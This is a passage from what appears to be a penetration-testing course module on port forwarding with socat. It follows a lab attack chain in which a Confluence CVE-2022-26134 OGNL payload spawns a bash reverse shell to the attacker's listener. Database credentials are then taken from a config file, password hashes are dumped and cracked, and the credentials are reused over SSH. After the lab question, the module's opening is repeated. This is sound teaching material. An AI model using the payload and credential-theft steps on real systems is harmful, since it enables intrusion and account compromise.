
# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

